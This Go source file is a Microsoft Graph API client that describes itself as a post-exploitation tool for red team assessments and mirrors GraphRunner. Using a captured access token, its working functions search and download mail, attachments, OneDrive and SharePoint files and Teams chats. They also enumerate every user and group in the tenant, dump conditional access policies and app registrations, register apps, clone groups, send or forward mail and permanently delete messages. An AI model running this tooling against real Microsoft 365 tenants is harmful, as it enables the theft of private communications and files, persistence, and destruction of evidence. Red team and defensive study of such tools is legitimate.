// Package graph provides a Microsoft Graph API client for post-exploitation
// operations during authorized red team assessments.
//
// Functionality mirrors GraphRunner (https://github.com/dafthack/GraphRunner):
// email search/export, OneDrive/SharePoint file search, Teams chat extraction,
// app deployment, mailbox discovery, group cloning, user attribute enumeration,
// conditional access policy dumping, and app registration auditing.
package graph

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

const graphBase = "https://graph.microsoft.com/v1.0"

// Client wraps the Graph API with a captured Bearer token.
type Client struct {
	accessToken string
	httpClient  *http.Client
}

// New creates a Graph API client using the provided access token.
func New(accessToken string) *Client {
	return &Client{
		accessToken: accessToken,
		httpClient:  &http.Client{Timeout: 30 * time.Second},
	}
}

func (c *Client) get(ctx context.Context, path string) (json.RawMessage, error) {
	return c.request(ctx, "GET", graphBase+path, nil, nil)
}

func (c *Client) getWithHeader(ctx context.Context, path string, extraHeaders map[string]string) (json.RawMessage, error) {
	return c.request(ctx, "GET", graphBase+path, nil, extraHeaders)
}

func (c *Client) post(ctx context.Context, path string, payload interface{}) (json.RawMessage, error) {
	data, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	return c.request(ctx, "POST", graphBase+path, bytes.NewReader(data), map[string]string{"Content-Type": "application/json"})
}

func (c *Client) request(ctx context.Context, method, fullURL string, body io.Reader, extraHeaders map[string]string) (json.RawMessage, error) {
	req, err := http.NewRequestWithContext(ctx, method, fullURL, body)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)
	req.Header.Set("Accept", "application/json")
	for k, v := range extraHeaders {
		req.Header.Set(k, v)
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 429 {
		hint := "Microsoft is throttling requests — wait before retrying"
		if ra := resp.Header.Get("Retry-After"); ra != "" {
			hint = fmt.Sprintf("Microsoft is throttling requests — retry after %s seconds", ra)
		}
		return nil, fmt.Errorf("%s: %s", hint, string(respBody))
	}
	if resp.StatusCode >= 400 {
		return nil, fmt.Errorf("graph api %s %s → %d: %s", method, fullURL, resp.StatusCode, string(respBody))
	}
	return json.RawMessage(respBody), nil
}

// SearchEmails searches the user's mailbox for messages matching query.
// Returns raw Graph API response with message list.
func (c *Client) SearchEmails(ctx context.Context, query string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 999 {
		top = 50
	}
	path := fmt.Sprintf("/me/messages?$search=%s&$top=%d",
		url.QueryEscape(`"`+query+`"`), top)
	return c.get(ctx, path)
}

// SearchOneDrive searches OneDrive and SharePoint files accessible to the user.
// If query is empty or "*", lists root children instead of searching.
func (c *Client) SearchOneDrive(ctx context.Context, query string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 200 {
		top = 50
	}
	query = strings.TrimSpace(query)
	if query == "" || query == "*" {
		path := fmt.Sprintf("/me/drive/root/children?$top=%d", top)
		return c.get(ctx, path)
	}
	path := fmt.Sprintf("/me/drive/root/search(q='%s')?$top=%d", url.QueryEscape(query), top)
	return c.get(ctx, path)
}

// ListDriveFolder lists the children of a specific drive item by item ID.
// Use "root" as itemID to list the root folder.
func (c *Client) ListDriveFolder(ctx context.Context, itemID string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 200 {
		top = 100
	}
	var path string
	if itemID == "" || itemID == "root" {
		path = fmt.Sprintf("/me/drive/root/children?$top=%d", top)
	} else {
		path = fmt.Sprintf("/me/drive/items/%s/children?$top=%d", itemID, top)
	}
	return c.get(ctx, path)
}

// GetDriveItemDownloadURL returns a pre-authenticated download URL for a file.
func (c *Client) GetDriveItemDownloadURL(ctx context.Context, itemID string) (string, error) {
	// Graph returns a 302 with Location header; we need to follow it to get the URL.
	req, err := http.NewRequestWithContext(ctx, "GET",
		fmt.Sprintf("https://graph.microsoft.com/v1.0/me/drive/items/%s/content", itemID), nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)

	// Don't follow redirects — we want the Location URL itself
	noRedirect := &http.Client{
		Timeout: 15 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	resp, err := noRedirect.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	loc := resp.Header.Get("Location")
	if loc == "" {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("no redirect location (status %d): %s", resp.StatusCode, string(body))
	}
	return loc, nil
}

// DownloadDriveItem streams a file's content directly.
func (c *Client) DownloadDriveItem(ctx context.Context, itemID string) (io.ReadCloser, string, error) {
	downloadURL, err := c.GetDriveItemDownloadURL(ctx, itemID)
	if err != nil {
		return nil, "", err
	}
	req, err := http.NewRequestWithContext(ctx, "GET", downloadURL, nil)
	if err != nil {
		return nil, "", err
	}
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	if resp.StatusCode >= 400 {
		resp.Body.Close()
		return nil, "", fmt.Errorf("download returned %d", resp.StatusCode)
	}
	contentDisp := resp.Header.Get("Content-Disposition")
	return resp.Body, contentDisp, nil
}

// GetTeamsChats returns all Teams chats visible to the user.
func (c *Client) GetTeamsChats(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/chats?$expand=members&$top=50")
}

// GetJoinedTeams returns all Teams the user is a member of.
func (c *Client) GetJoinedTeams(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/joinedTeams")
}

// GetTeamChannels returns channels for a specific team.
func (c *Client) GetTeamChannels(ctx context.Context, teamID string) (json.RawMessage, error) {
	return c.get(ctx, "/teams/"+teamID+"/channels")
}

// GetChannelMessages returns messages from a specific Teams channel.
func (c *Client) GetChannelMessages(ctx context.Context, teamID, channelID string) (json.RawMessage, error) {
	path := fmt.Sprintf("/teams/%s/channels/%s/messages?$top=50", teamID, channelID)
	return c.get(ctx, path)
}

// GetChatMessages returns messages from a direct/group chat.
func (c *Client) GetChatMessages(ctx context.Context, chatID string) (json.RawMessage, error) {
	return c.get(ctx, "/me/chats/"+chatID+"/messages?$top=50")
}

// DeployApp creates a new Azure AD application registration.
// Returns the created application object including appId.
func (c *Client) DeployApp(ctx context.Context, displayName, redirectURI string, requestedScopes []string) (json.RawMessage, error) {
	replyURIs := []string{}
	if redirectURI != "" {
		replyURIs = append(replyURIs, redirectURI)
	}
	payload := map[string]interface{}{
		"displayName":    displayName,
		"signInAudience": "AzureADMyOrg",
		"web": map[string]interface{}{
			"redirectUris":          replyURIs,
			"implicitGrantSettings": map[string]bool{"enableIdTokenIssuance": true},
		},
		"requiredResourceAccess": []interface{}{},
	}
	return c.post(ctx, "/applications", payload)
}

// DiscoverUsers lists all users in the tenant.
func (c *Client) DiscoverUsers(ctx context.Context) (json.RawMessage, error) {
	return c.getWithHeader(ctx,
		"/users?$top=999&$count=true",
		map[string]string{"ConsistencyLevel": "eventual"},
	)
}

// DiscoverMailboxes lists licensed member accounts.
func (c *Client) DiscoverMailboxes(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/users?$filter=userType eq 'Member'&$top=999")
}

// GetMailboxPermissions lists inbox rules for the current user (misconfiguration indicators).
func (c *Client) GetMailboxPermissions(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/mailFolders/inbox/messageRules")
}

// GetGroups lists all groups — both security and M365 groups.
func (c *Client) GetGroups(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/groups?$top=999")
}

// GetGroupMembers lists all members of a group.
func (c *Client) GetGroupMembers(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/members?$top=999")
}

// GetOwnedGroups lists groups the current user can modify.
func (c *Client) GetOwnedGroups(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/ownedObjects?$top=999")
}

// GetMemberGroups lists groups the current user is a member of.
func (c *Client) GetMemberGroups(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/memberOf?$top=999")
}

// CloneGroup creates a copy of an existing security group.
func (c *Client) CloneGroup(ctx context.Context, sourceGroupID, newDisplayName, description string) (json.RawMessage, error) {
	// Fetch source group metadata
	sourceData, err := c.get(ctx, "/groups/"+sourceGroupID+"?$select=id,description,groupTypes,mailEnabled,securityEnabled,mailNickname")
	if err != nil {
		return nil, fmt.Errorf("fetching source group: %w", err)
	}
	var src struct {
		Description     string   `json:"description"`
		GroupTypes      []string `json:"groupTypes"`
		MailEnabled     bool     `json:"mailEnabled"`
		SecurityEnabled bool     `json:"securityEnabled"`
	}
	json.Unmarshal(sourceData, &src)

	if description == "" {
		description = src.Description
	}
	payload := map[string]interface{}{
		"displayName":     newDisplayName,
		"description":     description,
		"groupTypes":      src.GroupTypes,
		"mailEnabled":     src.MailEnabled,
		"securityEnabled": src.SecurityEnabled,
		"mailNickname":    strings.ToLower(strings.ReplaceAll(newDisplayName, " ", "-")),
	}
	return c.post(ctx, "/groups", payload)
}

// SearchUserAttributes searches across user attributes for a keyword.
func (c *Client) SearchUserAttributes(ctx context.Context, query string) (json.RawMessage, error) {
	q := fmt.Sprintf(`"displayName:%s" OR "mail:%s" OR "department:%s" OR "jobTitle:%s"`, query, query, query, query)
	path := fmt.Sprintf("/users?$search=%s&$top=50&$count=true", url.QueryEscape(q))
	return c.getWithHeader(ctx, path, map[string]string{"ConsistencyLevel": "eventual"})
}

// DumpConditionalAccessPolicies returns all conditional access policies.
// Requires Policy.Read.All permission (typically available to admins).
func (c *Client) DumpConditionalAccessPolicies(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/identity/conditionalAccess/policies")
}

// DumpAppRegistrations lists all app registrations in the tenant.
// Requires Application.Read.All permission.
func (c *Client) DumpAppRegistrations(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/applications?$top=999")
}

// DumpServicePrincipals lists all service principals (enterprise apps).
func (c *Client) DumpServicePrincipals(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/servicePrincipals?$top=999")
}

// GetOAuth2PermissionGrants returns delegated OAuth2 permission grants (consent records).
// Useful for identifying over-privileged consented apps.
func (c *Client) GetOAuth2PermissionGrants(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/oauth2PermissionGrants?$top=999")
}

// GetMyApps lists apps the current user has consented to.
func (c *Client) GetMyApps(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/appRoleAssignments")
}

// GetCurrentUser returns the current user's full profile.
func (c *Client) GetCurrentUser(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me")
}

// GetUserManager returns the current user's manager.
func (c *Client) GetUserManager(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/manager?$select=id,displayName,mail,userPrincipalName,jobTitle")
}

// GetUserDirectReports returns direct reports of the current user.
func (c *Client) GetUserDirectReports(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/directReports?$select=id,displayName,mail,userPrincipalName,jobTitle")
}

// deleteResource issues a DELETE and discards the (empty) body.
func (c *Client) deleteResource(ctx context.Context, path string) error {
	req, err := http.NewRequestWithContext(ctx, "DELETE", graphBase+path, nil)
	if err != nil {
		return err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode >= 400 {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("graph DELETE %s → %d: %s", path, resp.StatusCode, string(body))
	}
	return nil
}

// ─── Mail ────────────────────────────────────────────────────────────────────

// GetMailFolders lists mail folders. mailboxID empty = current user (/me);
// non-empty = shared mailbox (/users/{mailboxID}).
func (c *Client) GetMailFolders(ctx context.Context, mailboxID string) (json.RawMessage, error) {
	prefix := "/me"
	if mailboxID != "" {
		prefix = "/users/" + url.PathEscape(mailboxID)
	}
	return c.get(ctx, prefix+"/mailFolders?$top=50&$select=id,displayName,totalItemCount,unreadItemCount")
}

// GetMailMessages lists messages in a folder. mailboxID empty = /me, non-empty = shared mailbox.
// folderID empty = inbox. order must be "asc" or "desc" (default "desc").
func (c *Client) GetMailMessages(ctx context.Context, mailboxID, folderID string, top, skip int, order string) (json.RawMessage, error) {
	if top <= 0 || top > 100 {
		top = 25
	}
	if order != "asc" {
		order = "desc"
	}
	prefix := "/me"
	if mailboxID != "" {
		prefix = "/users/" + url.PathEscape(mailboxID)
	}
	sel := "$select=id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance"
	var path string
	if folderID == "" {
		path = fmt.Sprintf("%s/mailFolders/inbox/messages?$top=%d&$skip=%d&$orderby=receivedDateTime%%20%s&%s", prefix, top, skip, order, sel)
	} else {
		path = fmt.Sprintf("%s/mailFolders/%s/messages?$top=%d&$skip=%d&$orderby=receivedDateTime%%20%s&%s", prefix, folderID, top, skip, order, sel)
	}
	return c.get(ctx, path)
}

// GetMailMessage returns a full message including rendered HTML body.
func (c *Client) GetMailMessage(ctx context.Context, messageID string) (json.RawMessage, error) {
	sel := "$select=id,subject,from,toRecipients,ccRecipients,receivedDateTime,body,isRead,importance,hasAttachments,attachments"
	return c.get(ctx, "/me/messages/"+messageID+"?"+sel)
}

// SendMail sends a new email.
func (c *Client) SendMail(ctx context.Context, toAddresses []string, subject, htmlBody string) error {
	recipients := make([]map[string]interface{}, len(toAddresses))
	for i, addr := range toAddresses {
		recipients[i] = map[string]interface{}{
			"emailAddress": map[string]string{"address": addr},
		}
	}
	payload := map[string]interface{}{
		"message": map[string]interface{}{
			"subject":      subject,
			"toRecipients": recipients,
			"body":         map[string]string{"contentType": "HTML", "content": htmlBody},
		},
		"saveToSentItems": true,
	}
	_, err := c.post(ctx, "/me/sendMail", payload)
	return err
}

// ReplyToMessage sends a reply to a message.
func (c *Client) ReplyToMessage(ctx context.Context, messageID, comment string) error {
	payload := map[string]interface{}{"comment": comment}
	_, err := c.post(ctx, "/me/messages/"+messageID+"/reply", payload)
	return err
}

// ForwardMessage forwards a message to one or more addresses.
func (c *Client) ForwardMessage(ctx context.Context, messageID string, toAddresses []string, comment string) error {
	recipients := make([]map[string]interface{}, len(toAddresses))
	for i, addr := range toAddresses {
		recipients[i] = map[string]interface{}{
			"emailAddress": map[string]string{"address": addr},
		}
	}
	payload := map[string]interface{}{
		"comment":      comment,
		"toRecipients": recipients,
	}
	_, err := c.post(ctx, "/me/messages/"+messageID+"/forward", payload)
	return err
}

// DeleteMessage moves a message to the Deleted Items folder.
func (c *Client) DeleteMessage(ctx context.Context, messageID string) error {
	return c.deleteResource(ctx, "/me/messages/"+messageID)
}

// MoveMessage moves a message to a destination folder.
func (c *Client) MoveMessage(ctx context.Context, messageID, destFolderID string) (json.RawMessage, error) {
	payload := map[string]string{"destinationId": destFolderID}
	return c.post(ctx, "/me/messages/"+messageID+"/move", payload)
}

// ─── Drive (enhanced) ────────────────────────────────────────────────────────

// UploadDriveItem uploads a file into a folder (folderItemID empty = root).
// Uses simple upload suitable for files < 4 MB.
func (c *Client) UploadDriveItem(ctx context.Context, folderItemID, filename string, content io.Reader) (json.RawMessage, error) {
	var fullURL string
	escaped := url.PathEscape(filename)
	if folderItemID == "" || folderItemID == "root" {
		fullURL = graphBase + "/me/drive/root:/" + escaped + ":/content"
	} else {
		fullURL = graphBase + "/me/drive/items/" + folderItemID + ":/" + escaped + ":/content"
	}
	return c.request(ctx, "PUT", fullURL, content, map[string]string{"Content-Type": "application/octet-stream"})
}

// DeleteDriveItem permanently deletes a drive item.
func (c *Client) DeleteDriveItem(ctx context.Context, itemID string) error {
	return c.deleteResource(ctx, "/me/drive/items/"+itemID)
}

// ListRecentDriveItems returns recently accessed drive items.
func (c *Client) ListRecentDriveItems(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/drive/recent?$top=50")
}

// ─── Authentication Methods ──────────────────────────────────────────────────

// GetAuthenticationMethods returns all registered auth methods for the current user.
// Uses the beta endpoint which has fewer permission restrictions than v1.0.
func (c *Client) GetAuthenticationMethods(ctx context.Context) (json.RawMessage, error) {
	req, err := http.NewRequestWithContext(ctx, "GET", "https://graph.microsoft.com/beta/me/authentication/methods", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)
	req.Header.Set("Accept", "application/json")
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	if resp.StatusCode == 403 {
		return nil, fmt.Errorf("403 Forbidden — el token no tiene el permiso UserAuthenticationMethod.Read. Scope requerido: 'UserAuthenticationMethod.Read' o usa un client_id con ese permiso pre-consentido")
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("graph api beta/me/authentication/methods → %d: %s", resp.StatusCode, string(body))
	}
	return body, nil
}

// ─── Teams (interactive) ─────────────────────────────────────────────────────

// SendChatMessage posts a text message to a chat.
func (c *Client) SendChatMessage(ctx context.Context, chatID, content string) (json.RawMessage, error) {
	payload := map[string]interface{}{
		"body": map[string]string{"content": content, "contentType": "text"},
	}
	return c.post(ctx, "/me/chats/"+chatID+"/messages", payload)
}

// SendChannelMessage posts a text message to a team channel.
func (c *Client) SendChannelMessage(ctx context.Context, teamID, channelID, content string) (json.RawMessage, error) {
	payload := map[string]interface{}{
		"body": map[string]string{"content": content, "contentType": "text"},
	}
	return c.post(ctx, "/teams/"+teamID+"/channels/"+channelID+"/messages", payload)
}

// CreateChat creates a new one-on-one or group chat.
func (c *Client) CreateChat(ctx context.Context, memberIDs []string, chatType string) (json.RawMessage, error) {
	members := make([]map[string]interface{}, len(memberIDs))
	for i, id := range memberIDs {
		members[i] = map[string]interface{}{
			"@odata.type":     "#microsoft.graph.aadUserConversationMember",
			"roles":           []string{"owner"},
			"user@odata.bind": graphBase + "/users/" + id,
		}
	}
	payload := map[string]interface{}{
		"chatType": chatType, // "oneOnOne" | "group"
		"members":  members,
	}
	return c.post(ctx, "/chats", payload)
}

// ─── Groups (detailed) ───────────────────────────────────────────────────────

// GetGroupInfo returns full group metadata.
func (c *Client) GetGroupInfo(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"?$select=id,displayName,description,groupTypes,mail,mailEnabled,securityEnabled,createdDateTime,membershipRule,visibility")
}

// GetGroupOwners lists owners of a group.
func (c *Client) GetGroupOwners(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/owners?$top=100&$select=id,displayName,mail,userPrincipalName,jobTitle")
}

// GetGroupMemberOf lists groups that a group belongs to.
func (c *Client) GetGroupMemberOf(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/memberOf?$top=100")
}

// GetGroupDrives lists SharePoint drives associated with a group.
func (c *Client) GetGroupDrives(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/drives")
}

// GetGroupSites lists SharePoint sites for a group.
func (c *Client) GetGroupSites(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/sites?$select=id,displayName,webUrl,createdDateTime")
}

// GetGroupAppRoles lists app role assignments for a group.
func (c *Client) GetGroupAppRoles(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.get(ctx, "/groups/"+groupID+"/appRoleAssignments")
}

// GetGroupTransitiveMembers lists all direct and transitive members.
func (c *Client) GetGroupTransitiveMembers(ctx context.Context, groupID string) (json.RawMessage, error) {
	return c.getWithHeader(ctx,
		"/groups/"+groupID+"/transitiveMembers?$top=999&$count=true&$select=id,displayName,mail,userPrincipalName,jobTitle",
		map[string]string{"ConsistencyLevel": "eventual"},
	)
}

// ─── Users (detailed) ────────────────────────────────────────────────────────

// GetUserInfo returns detailed info for a specific user by ID or UPN.
func (c *Client) GetUserInfo(ctx context.Context, userID string) (json.RawMessage, error) {
	sel := "$select=id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones,assignedLicenses,usageLocation,accountEnabled,createdDateTime,lastPasswordChangeDateTime,signInSessionsValidFromDateTime"
	return c.get(ctx, "/users/"+userID+"?"+sel)
}

// GetUserMemberOf returns the groups a user is a member of.
func (c *Client) GetUserMemberOf(ctx context.Context, userID string) (json.RawMessage, error) {
	return c.get(ctx, "/users/"+userID+"/memberOf?$top=100&$select=id,displayName,groupTypes,mail")
}

// ─── M365 Search ─────────────────────────────────────────────────────────────

// SearchContent searches across M365 using the Microsoft Search API.
// entityTypes examples: ["message","driveItem","site","chatMessage","listItem"]
func (c *Client) SearchContent(ctx context.Context, queryText string, entityTypes []string, top int) (json.RawMessage, error) {
	if top <= 0 || top > 50 {
		top = 25
	}
	payload := map[string]interface{}{
		"requests": []map[string]interface{}{
			{
				"entityTypes": entityTypes,
				"query":       map[string]string{"queryString": queryText},
				"from":        0,
				"size":        top,
				"fields":      []string{"id", "name", "subject", "summary", "webUrl", "lastModifiedDateTime", "size", "from"},
			},
		},
	}
	return c.post(ctx, "/search/query", payload)
}

// ─── Drive — extra ────────────────────────────────────────────────────────────

// GetSharedWithMe returns items shared with the current user.
func (c *Client) GetSharedWithMe(ctx context.Context) (json.RawMessage, error) {
	return c.get(ctx, "/me/drive/sharedWithMe?$top=100&$select=id,name,size,lastModifiedDateTime,webUrl,remoteItem")
}

// ─── Mail — attachments & compose ────────────────────────────────────────────

// ListMessageAttachments lists all attachments for a mail message.
func (c *Client) ListMessageAttachments(ctx context.Context, messageID string) (json.RawMessage, error) {
	return c.get(ctx, "/me/messages/"+messageID+"/attachments?$select=id,name,size,contentType,isInline")
}

// DownloadMessageAttachment returns the raw content bytes of an attachment.
func (c *Client) DownloadMessageAttachment(ctx context.Context, messageID, attachmentID string) ([]byte, string, error) {
	path := "/me/messages/" + messageID + "/attachments/" + attachmentID + "/$value"
	req, err := http.NewRequestWithContext(ctx, "GET", graphBase+path, nil)
	if err != nil {
		return nil, "", err
	}
	req.Header.Set("Authorization", "Bearer "+c.accessToken)
	resp, err := c.httpClient.Do(req)
	if err != nil {
		return nil, "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return nil, "", fmt.Errorf("attachment download %d", resp.StatusCode)
	}
	data, _ := io.ReadAll(resp.Body)
	ct := resp.Header.Get("Content-Type")
	return data, ct, nil
}

// PermanentDeleteMessage permanently deletes a message (bypasses Deleted Items).
func (c *Client) PermanentDeleteMessage(ctx context.Context, messageID string) error {
	_, err := c.post(ctx, "/me/messages/"+messageID+"/permanentDelete", nil)
	return err
}

// CreateMailDraft creates a draft message and returns the draft object.
func (c *Client) CreateMailDraft(ctx context.Context, subject, htmlBody string, toAddresses []string) (json.RawMessage, error) {
	recipients := make([]map[string]interface{}, len(toAddresses))
	for i, addr := range toAddresses {
		recipients[i] = map[string]interface{}{
			"emailAddress": map[string]string{"address": addr},
		}
	}
	payload := map[string]interface{}{
		"subject":      subject,
		"body":         map[string]string{"contentType": "HTML", "content": htmlBody},
		"toRecipients": recipients,
	}
	return c.post(ctx, "/me/messages", payload)
}

// AddAttachmentToDraft attaches a file to a draft message.
func (c *Client) AddAttachmentToDraft(ctx context.Context, messageID, filename, contentType string, data []byte) error {
	payload := map[string]interface{}{
		"@odata.type": "#microsoft.graph.fileAttachment",
		"name":        filename,
		"contentType": contentType,
		"contentBytes": base64.StdEncoding.EncodeToString(data),
	}
	_, err := c.post(ctx, "/me/messages/"+messageID+"/attachments", payload)
	return err
}

// SendDraft sends a previously created draft message.
func (c *Client) SendDraft(ctx context.Context, messageID string) error {
	_, err := c.post(ctx, "/me/messages/"+messageID+"/send", nil)
	return err
}

// ─── User batch details ───────────────────────────────────────────────────────

// GetUserDetailsBatch fetches comprehensive user data in a single $batch request.
// Returns: profile, transitive group memberships, owned objects, app role assignments, OAuth2 grants.
func (c *Client) GetUserDetailsBatch(ctx context.Context, userID string) (json.RawMessage, error) {
	sel := "id,displayName,mail,userPrincipalName,jobTitle,department,officeLocation,mobilePhone,businessPhones,assignedLicenses,usageLocation,accountEnabled,createdDateTime,lastPasswordChangeDateTime"
	requests := []map[string]interface{}{
		{"id": "1", "method": "GET", "url": "/users/" + userID + "?$select=" + sel},
		{"id": "2", "method": "GET", "url": "/users/" + userID + "/transitiveMemberOf?$top=100&$select=id,displayName,groupTypes"},
		{"id": "3", "method": "GET", "url": "/users/" + userID + "/ownedObjects?$top=50&$select=id,displayName"},
		{"id": "4", "method": "GET", "url": "/users/" + userID + "/appRoleAssignments?$top=50"},
		{"id": "5", "method": "GET", "url": "/users/" + userID + "/oauth2PermissionGrants?$top=50"},
	}
	return c.post(ctx, "/$batch", map[string]interface{}{"requests": requests})
}
